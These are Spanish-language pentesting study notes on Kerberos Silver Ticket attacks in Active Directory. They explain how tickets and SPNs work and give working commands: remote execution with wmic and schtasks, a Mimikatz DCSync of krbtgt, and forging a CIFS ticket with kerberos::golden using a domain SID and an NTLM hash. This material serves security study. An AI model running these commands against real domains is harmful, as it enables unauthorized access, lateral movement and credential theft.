# Silver Ticket 

Tags: #AD #Windows #Persistencia #SilverTicket

Un **Silver Ticket** puede ser generado por un atacante que haya obtenido credenciales específicas dentro de un dominio, particularmente el **hash NTLM** de la contraseña de una cuenta de servicio o de la cuenta de computadora asociada a un servicio específico. Utilizando este hash, el atacante puede crear un **Ticket de Servicio Kerberos (TGS)**, que será reconocido como válido para el servicio al que corresponde el hash comprometido, permitiéndole acceso sin necesidad de interactuar con el controlador de dominio.

```bash 
El proceso de autenticación de Kerberos en Active Directory implica dos tipos principales de tickets: el Ticket Granting Ticket (TGT) y el Ticket Granting Service (TGS). El TGT se utiliza para solicitar TGSs para servicios específicos. En un ataque de Silver Ticket, un atacante utiliza un TGS falsificado para acceder a un servicio específico sin la necesidad de autenticarse a través del Controlador de Dominio (DC).

¿Qué puede hacer un atacante con un Silver Ticket? A diferencia del Golden Ticket, que brinda acceso a cualquier servicio dentro del dominio, el Silver Ticket se limita al servicio para el cual fue generado. Por ejemplo, si un atacante tiene el hash de la cuenta de un servidor de archivos, puede emitir un Silver Ticket para autenticarse contra ese servidor de archivos específico y tener los mismos derechos que la cuenta de servicio comprometida.


Riesgos del Silver Ticket: Los riesgos asociados con los Silver Tickets incluyen pero no se limitan a:
- Acceso no autorizado a servicios específicos como servidores de archivos, servidores de bases de datos, o cualquier otro servicio que use Kerberos para la autenticación.
- Posibilidad de moverse lateralmente dentro de la red utilizando los permisos del servicio comprometido.
- Dificultad para detectar el ataque, ya que no requiere la interacción con el Controlador de Dominio para validar el ticket después de su creación.
```

## Service Principal Name (SPN)

Un **Service Principal Name (SPN)** es un identificador único asignado a cada instancia de servicio que opera en un servidor y emplea el protocolo de autenticación Kerberos. En entornos de **Active Directory (AD)**, los SPN permiten que los clientes asocien un servicio específico con una cuenta de inicio de sesión, facilitando así la autenticación segura de los servicios de red y garantizando que las solicitudes se dirijan al servicio correcto.

```bash 
1. HTTP: Se utiliza para servicios web o aplicaciones que funcionan sobre HTTP/S. Es importante para la autenticación en aplicaciones web y servicios que utilizan Kerberos para la autenticación integrada de Windows.
2. MSSQLSvc: Utilizado por las instancias de Microsoft SQL Server. Este es crítico para la autenticación y las conexiones seguras a bases de datos SQL.
3. WSMAN: Utilizado para la administración basada en estándares de hardware y sistemas operativos (Windows Remote Management).
4. TERMSRV: Utilizado por los servicios de Terminal Server (Remote Desktop Services). Es vital para la autenticación en sesiones de escritorio remoto.
5. CIFS: Utilizado para el sistema de archivos de Internet común, relacionado con el intercambio de archivos y los servicios de impresión.
6. HOST: Un SPN genérico que representa cualquier servicio predeterminado en un sistema operativo Windows.
7. SMTPSvc: Para el servicio de transporte de correo simple, utilizado en la autenticación de servidores de correo electrónico.
```


| Tipo de servicio                           | Service Silver Tickets | Comando relacionado al ataque                                                                                  |
| ------------------------------------------ | ---------------------- | -------------------------------------------------------------------------------------------------------------- |
| WMI                                        | HOST + RPCSS           | wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"                  |
| PowerShell Remoting                        | CIFS + HTTP + (wsman?) | New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC                                          |
| WinRM                                      | HTTP + wsman           | New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC                                          |
| Scheduled Tasks                            | HOST                   | schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1" |
| Windows File Share (CIFS)                  | CIFS                   | dir \\dc01\c$                                                                                                  |
| LDAP operations including Mimikatz DCSync  | LDAP                   | lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt                                                     |
| Windows Remote Server Administration Tools | RPCSS + LDAP + CIFS    | /                                                                                                              |

## Silver Ticket para CIFS

```bash 
# Vamos a generar un silver ticket para el servicio de CIFS y para ello es necesario tener:
- SID del dominio
- HASH NTLM DE USER-SERVER
```

```powershell
# Verificar si tenemos visibilidad de los recursos 
❯ dir \\USER-SERVER.domain1.corp\c$   
❯ hostname
❯ whoami
❯ ipconfig

❯ nltest /domain_trusts /v       # Se puede ver las relaciones de confianza entre los dominios y sus SID.
```

```powershell
❯ mimikatz.exe     # Los tickets solicitados se guradan en 'cache'
	# kerberos::golden /user:Administrator /domain:domain1.corp /sid:S-1-5-21-1861162130-2580302541-221646211 /target:USER-SERVER.domain1.corp /rc4:dadef894e564c991a5a5714e0a7efc67 /service:CIFS /ptt 
	# exit 

Notas: 
	# sid = Es el ID del dominio 'domain1.corp'


❯ klist    # Mirar los tickets 

❯ dir \\USER-SERVER.domain1.corp\c$   # Mirar los recursos compartidos 
```